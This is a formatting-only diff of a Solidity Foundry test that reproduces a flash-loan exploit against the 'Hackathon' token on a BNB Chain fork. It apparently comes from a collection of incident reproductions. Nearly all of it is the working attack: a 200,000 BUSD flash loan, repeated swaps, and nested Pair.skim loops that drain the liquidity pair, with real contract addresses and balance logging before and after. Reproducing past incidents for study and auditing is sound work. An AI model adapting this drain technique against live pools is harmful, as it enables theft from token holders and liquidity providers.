@@ -16,48 +16,45 @@ contract Exploit is Test {
     IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 Hackathon = IERC20(0x11cee747Faaf0C0801075253ac28aB503C888888);
 
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 37854043);
-        deal(address(BUSD),address(this),0);
-
+        cheats.createSelectFork("bsc", 37_854_043);
+        deal(address(BUSD), address(this), 0);
     }
 
     function testExploit() public {
         emit log_named_decimal_uint(
             "attacker balance BUSD before attack:", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
-        DPP.flashLoan(0, 200000 ether, address(this), new bytes(1));
+        DPP.flashLoan(0, 200_000 ether, address(this), new bytes(1));
         emit log_named_decimal_uint(
             "attacker balance BUSD after attack:", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
-            BUSD.approve(address(Pair), type(uint256).max);
-            BUSD.approve(address(Router), type(uint256).max);
-            uint256 j=0;
-            while(j<10){
-                uint256 i=0;
-                swap_token_to_token(address(BUSD), address(Hackathon), 200000 * 1e18);
-                Hackathon.transfer(address(Pair),Hackathon.balanceOf(address(this)));
-                while (i < 10) {
-                    Pair.skim(address(Pair));
-                    Pair.skim(address(this));
-                    i++;
-                }
-                swap_token_to_token(address(Hackathon), address(BUSD), Hackathon.balanceOf(address(this)));
-                j++;
+        BUSD.approve(address(Pair), type(uint256).max);
+        BUSD.approve(address(Router), type(uint256).max);
+        uint256 j = 0;
+        while (j < 10) {
+            uint256 i = 0;
+            swap_token_to_token(address(BUSD), address(Hackathon), 200_000 * 1e18);
+            Hackathon.transfer(address(Pair), Hackathon.balanceOf(address(this)));
+            while (i < 10) {
+                Pair.skim(address(Pair));
+                Pair.skim(address(this));
+                i++;
             }
-            BUSD.transfer(address(msg.sender),quoteAmount);
+            swap_token_to_token(address(Hackathon), address(BUSD), Hackathon.balanceOf(address(this)));
+            j++;
+        }
+        BUSD.transfer(address(msg.sender), quoteAmount);
     }
-        function swap_token_to_token(address a,address b,uint256 amount) internal {
+
+    function swap_token_to_token(address a, address b, uint256 amount) internal {
         IERC20(a).approve(address(Router), amount);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount, 0, path, address(this), block.timestamp
-        );
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
     }
 }
